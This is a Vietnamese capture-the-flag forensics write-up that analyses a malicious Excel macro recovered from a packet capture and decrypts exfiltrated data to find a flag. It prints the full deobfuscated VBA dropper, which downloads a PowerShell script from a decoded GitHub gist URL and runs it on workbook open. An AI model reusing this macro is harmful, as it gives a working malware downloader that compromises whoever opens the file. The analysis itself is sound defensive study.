![Screenshot (4452)](https://github.com/NVex0/uWU/assets/113530029/fb8ee111-d71e-48de-9d56-2cae5b023c32)

#### Solve:

Vẫn là Hoà và tài liệu độc hại của anh ấy. Đề cho ta 1 file pcap, dựa theo mô tả của đề thì có vẻ đây là capture của traffic khi thầy giáo nhận file độc từ Hoà. Mình sẽ extract tài liệu đó trên HTTP object list:

![Screenshot (4453)](https://github.com/NVex0/uWU/assets/113530029/20002710-b291-49fc-bccd-5a397f6e3ba2)

 `olevba` đầu tiên thôi :v: :

![image](https://github.com/NVex0/uWU/assets/113530029/34ed6a24-738b-486d-9a8d-bbb22ccb5964)

Ta thấy đoạn malicious code này bị obfuscate khá đau mắt, tuy nhiên để ý thì có vẻ như nó chỉ bị obfu bằng xài mấy tên biến non-ascii kì cục :v 

Sử dụng cyberchef, mình sửa chay từng biến 1 :D và nhìn ra mặt code:

```
Function func1(var17)
var12 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
var16 = "ãXL1lYU~Ùä,Ca²ZfÃ@dO-cq³áÕsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(ÒSw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
For y = 1 To Len(var17)
var4 = InStr(var12, Mid(var17, y, 1))
If var4 > 0 Then
var11 = Mid(var16, var4, 1)
var13 = var13 + var11
Else
var13 = var13 + Mid(var17, y, 1)
End If
Next
func1 = var13
For var26 = 1 To Len(var23)
var23 = var26
Next
For var30 = 2 To Len(var24)
var24 = 2
Next
For var33 = 3 To Len(var28)
var28 = var33
Next
For var18 = 4 To Len(var22)
var22 = 2
Next
End Function
Sub Workbook_Open()
Dim var31 As Object
Dim var21 As String
Dim var29 As String
Dim var19 As String
Dim var14 As Integer
var14 = Chr(50) + Chr(48) + Chr(48)
Set var31 = CreateObject("WScript.Shell")
var21 = var31.SpecialFolders("AppData")
Dim var9
Dim var6
Dim var3
Dim var26 As Long
Dim var30 As String
Dim var25 As Long
Dim var28 As String
Dim var33 As Long
Dim var18 As String
Dim var32 As String
Dim var24 As Long
Dim var10
Dim var15
Dim a0 As Integer
Dim var2
Dim var7
a0 = 1
Range("A1").Value = func1("4BEiàiuP3x6¿QEi³")
Dim var8 As String
var1 = "$x¿PÜ_jEPkEEiPÜ_6IE3P_i3PÛx¿²PàQBx²³_i³P3x6¿QEi³bPÜ_jEPkEEiPb³x#Eir" & vbCrLf & "ÒxP²E³²àEjEP³ÜEbEP3_³_(PÛx¿P_²EP²E7¿à²E3P³xP³²_ib0E²P@mmIP³xP³ÜEP0x##xÄàiuPk_iIP_66x¿i³Pi¿QkE²:P" & vbCrLf & "@m@m@mo@@§mmm" & vbCrLf & "g66x¿i³PÜx#3E²:PLu¿ÛEiPÒÜ_iÜP!xiu" & vbCrLf & "t_iI:PTtPt_iI"
var8 = func1(var1)
MsgBox var8, vbInformation, func1("pEP3EEB#ÛP²Eu²E³P³xPài0x²QPÛx¿")
Dim var20 As Date
Dim var27 As Date
var20 = Date
var27 = DateSerial(2023, 6, 6)
If var20 < var27 Then
Set var2 = CreateObject("microsoft.xmlhttp")
Set var15 = CreateObject("Shell.Application")
var10 = var21 + func1("\k¿i6Ü_~Bb@")
var2.Open "get", func1("Ü³³Bb://uàb³~uà³Ü¿k¿bE²6xi³Ei³~6xQ/k7¿_iQ_i/fÀ3_o-3Yf0_E6m6kk3_km§3Y03ÀY_3__/²_Ä/À3EÀkfmfÀ@Eããoãä§k@_@ã0ä6_E3-ãY036-@@koo/_Àmb6m@§~Bb@"), False
var2.send
var6 = var2.responseBody
If var2.Status = 200 Then
Set var9 = CreateObject("adodb.stream")
var9.Open
var9.Type = a0
var9.Write var6
var9.SaveToFile var10, a0 + a0
var9.Close
End If
var15.Open (var10)
Else
MsgBox func1("åxi'³P³²ÛP³xP²¿iPQEPk²x")
End If
End Sub
```

Đầu tiên với hàm `func1`, ta thấy nó nhận vào 1 chuỗi, trả về kí tự index thứ `var4` trên `var16`. `var4` là kết quả từ việc match xem kí tự lần đầu của chuỗi xuất hiện trong `var12` là ở đâu. Lặp liên tục trên len của chuỗi đầu vào, hàm trả về cho ta 1 string.

Func1 được gọi rất nhiều lần, mình viết code sau và decode từng đoạn gọi tới func1:

```
var2 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
var3 = "ãXL1lYU~Ùä,Ca²ZfÃ@dO-cq³áÕsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(ÒSw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
v1 = input()

out = ""
for i in range(len(v1)):
    if v1[i] == ':':
        out += ':'
    elif v1[i] =='/':
        out += '/'
    for j in range(len(var2)):
        if var2[j] == v1[i]:
            out += var3[j]
print(out)
```
Lần lượt với chuỗi đầu vào func, ta được các output như sau:

`Opening document`

`We deeply regret to inform you`

`buncha.ps1`

`https://gist.githubusercontent.com/bquanman/98da73d49faec0cbbdab02d4fd84adaa/raw/8de8b90981e667652b1a16f5caed364fdc311b77/a80sc012.ps1`

`Dont try to run me bro`

Chung quy lại là code này thực thi việc tải xuống file ps1 kia và lưu vào Appdata. Vào đường dẫn mà file được tải xuống:

![image](https://github.com/NVex0/uWU/assets/113530029/d4462edb-e086-40ed-9fde-5a9b91215a16)

Vẫn là base64 và deflate compress :v, ta làm tương tự như đoạn đầu thôi, và được 1 obfuscated code khác. Mình sử dụng `PowerDecode` để deobfuscate. 

Đoạn code sau khi deob nhìn khá rõ ràng. Cụ thể code này sử dụng AES-CBC Zero Padding với key có sẵn trong code. IV lấy 16 bytes nối với data sau khi encrypt. 
Sau đó là tạo stream để POST data lên kết nối được thiết lập trước. 

Vậy nên với file pcap của đề, mình sẽ tiến hành decrypt data mà Hoà lấy được từ máy thầy. Đầu tiên mình sort theo HTTP POST:

![image](https://github.com/NVex0/uWU/assets/113530029/027fd81a-9998-42ca-8b0e-884402d47b91)

Sau đó decrypt data bên client gửi bằng cách cắt đi 16 bytes đầu làm IV, key trong code và phần còn lại là encrypted data. Mình thử decrypt từng cái 1 và cuối cùng có được thứ mình cần ở stream POST lượng data lớn nhất. 

Phần data ta phải xử lý qua bằng URL decode trước. Sau đó mình decrypt với Cyberchef:

![image](https://github.com/NVex0/uWU/assets/113530029/d604601b-c12e-4fa8-b734-0e33181b8bc2)

Để ý thì kia là header của PNG, decode và save về, ta được 1 bức QR:

![image](https://github.com/NVex0/uWU/assets/113530029/0449648b-a836-47b3-93db-c23d9185768a)

Scan và mình có được Flag:

Flag: `CHH{D0n't_w0rRy_n0_st@r_wh3rE}`
